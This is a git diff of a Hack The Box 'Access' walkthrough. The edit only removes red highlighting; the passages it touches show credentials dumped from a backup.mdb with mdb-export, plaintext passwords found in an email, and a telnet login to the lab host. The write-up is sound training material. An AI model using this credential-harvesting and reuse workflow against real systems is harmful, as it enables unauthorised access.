@@ -83,10 +83,10 @@ After exploring the FTP shell, I found two files `backup.mdb` and `Access Contro
 
 A little Google-Fu helped me to figure out what a `mdb` file was and how I could use command-line tools in kali to view the contents.
 
-````console
+```console
 htb@noone:~/Access$ mdb-tables backup.mdb
 acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc
-auth_group_permissions auth_message auth_permission <span style="color:red">auth_user</span> auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS
+auth_group_permissions auth_message auth_permission - auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS
 deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog
 ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam
 auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate
@@ -95,9 +95,9 @@ FaceTempEx FingerVeinEx TEMPLATEEx
 htb@noone:~/Access$ mdb-export backup.mdb auth_user
 id,username,password,Status,last_login,RoleID,Remark
 25,"admin","admin",1,"08/23/18 21:11:47",26,
-27,<span style="color:red">"engineer"</span>,<span style="color:red">"access4u@security"</span>,1,"08/23/18 21:13:36",26,
-28,<span style="color:red">"backup_admin"</span>,<span style="color:red">"admin"</span>,1,"08/23/18 21:14:02",26,
-````
+27,"engineer" ,"access4u@security" ,1,"08/23/18 21:13:36",26,
+28,"backup_admin" ,"admin" ,1,"08/23/18 21:14:02",26,
+```
 
 Credentials found for some users. Now let's try to access the zip archive.
 
@@ -132,7 +132,7 @@ Hi there,
 
 
 
-The password for the <span style="color:red">“security”</span> account has been changed to <span style="color:red">4Cc3ssC0ntr0ller</span>.  Please ensure this is passed on to your engineers.
+The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
 
 
 
@@ -150,7 +150,7 @@ Connected to 10.10.10.98.
 Escape character is '^]'.
 Welcome to Microsoft Telnet Service
 
-password:<span style="color:red">4Cc3ssC0ntr0ller</span>
+password:4Cc3ssC0ntr0ller
 
 *===============================================================
 Microsoft Telnet Server.
